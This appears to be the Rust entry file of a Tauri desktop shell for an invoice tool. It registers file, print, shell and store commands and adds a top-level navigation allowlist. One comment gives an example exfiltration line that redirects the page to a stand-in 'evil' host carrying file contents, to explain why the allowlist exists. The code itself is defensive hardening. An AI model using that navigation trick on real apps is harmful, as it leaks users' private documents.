//! 桌面外壳的入口：装插件、登记命令、把窗口交给前端（`apps/web` 的构建产物）。
//!
//! **业务逻辑一行都不在这里。** 解析、去重、排版、合成打印 PDF 全在 `packages/core`
//! （TypeScript），网页版与桌面版共用同一份 —— 外壳只补前端做不到的事：
//! 系统对话框、直接读写文件、交给系统打印、在文件管理器里显示。
//!
//! 6 个能力模块（见 `docs/桌面端参考.md`）：
//! `app` 应用信息 / `dialog` 原生对话框 / `files` 字节进出 /
//! `print` 系统打印 / `shell` 交给系统 / `store` 数据目录
//!
//! ⚠️ 编译纪律：本机（8 GB）只许 `cargo check -j 2`，发布包一律在 CI 构建（AGENTS.md 第 1 节）。

use tauri::{WebviewUrl, WebviewWindowBuilder};

mod app;
mod dialog;
mod files;
mod print;
mod shell;
mod store;

/**
 * 顶层导航白名单。
 *
 * CSP 的 `connect-src 'self'` 挡不住 `location.href = 'https://evil/?d=…'`：
 * 顶层导航不受 connect-src 约束。渲染层若被攻破，`read_document` + 一次导航
 * 就能把文件内容带出去。窗口由代码创建（不写在 tauri.conf.json 里），就是为了能挂上这个钩子。
 *
 * 只放行**精确 origin**：主机名对、端口必须没有。原来只比主机名，于是
 * `http://localhost:8080/…`（本机任意开发服务）也被放行 —— 那不是我们的 origin。
 */
fn navigation_allowed(url: &tauri::Url) -> bool {
    if url.as_str() == "about:blank" {
        return true;
    }
    // 开发服务器（tauri dev，见 tauri.conf.json 的 build.devUrl）
    if cfg!(debug_assertions)
        && url.scheme() == "http"
        && url.host_str() == Some("127.0.0.1")
        && url.port() == Some(5180)
    {
        return true;
    }
    // 带端口的 localhost 一概不认（上面的开发服务器已经单独处理过）
    if url.port().is_some() {
        return false;
    }
    matches!(
        (url.scheme(), url.host_str()),
        // macOS / Linux：自定义协议
        ("tauri", Some("localhost"))
            // Windows：WebView2 只认 http(s)，自定义协议被映射成这两个主机
            | ("http", Some("tauri.localhost"))
            | ("http", Some("ipc.localhost"))
    )
}

#[cfg_attr(mobile, tauri::mobile_entry_point)]
pub fn run() {
    tauri::Builder::default()
        // 本次会话里「用户选过 / 应用写出」的路径。read_document / open_path 只认这份清单。
        .manage(files::TrustedPaths::default())
        // 单实例：第二次启动不再开第二个进程，而是把已有窗口叫到前面。
        // 两个实例会同时打开同一份 IndexedDB（webview 的数据目录只有一个），
        // 互相覆盖对方的写入 —— 桌面版必须挡住这件事。
        .plugin(tauri_plugin_single_instance::init(|app, _argv, _cwd| {
            app::focus_main(app);
        }))
        // 对话框能力（真正发起对话框的是 Rust 侧的命令，这里只是把插件装上）
        .plugin(tauri_plugin_dialog::init())
        .invoke_handler(tauri::generate_handler![
            app::app_info,
            dialog::pick_documents,
            files::read_document,
            files::save_document,
            print::print_document,
            shell::reveal_path,
            shell::open_path,
            store::store_list,
            store::store_read,
            store::store_write,
            store::store_append,
            store::store_remove,
        ])
        .setup(|app| {
            // 启动就把数据目录建好：用户第一次点「打开数据目录」时不该看到「不存在」。
            // 建不出来也不拦启动 —— 日志少一条，比打不开程序强。
            if let Err(err) = app::ensure_data_dir(app.handle()) {
                eprintln!("[invoice-tool] {err}");
            }
            // 上次打印留下的临时 PDF（里面有完整票面）不该永久躺在缓存里
            files::cleanup_print_cache(app.handle());

            // 窗口在代码里建：只有这里能挂 `on_navigation` 白名单。
            // 建不出来就不能「静默继续」—— 那是一个没有窗口的进程，用户只会看到
            // 图标亮一下又消失（或 Dock 里挂着打不开的图标）。交给 `.expect` 报错。
            WebviewWindowBuilder::new(
                app,
                "main",
                WebviewUrl::App("index.html".into()),
            )
            .title("发票工具")
            .inner_size(1280.0, 860.0)
            .min_inner_size(1024.0, 680.0)
            .center()
            .resizable(true)
            .disable_drag_drop_handler()
            .zoom_hotkeys_enabled(true)
            .on_navigation(|url| navigation_allowed(url))
            .build()
            .map_err(|err| format!("建窗口失败：{err}"))?;
            Ok(())
        })
        .run(tauri::generate_context!())
        .expect("发票工具启动失败");
}
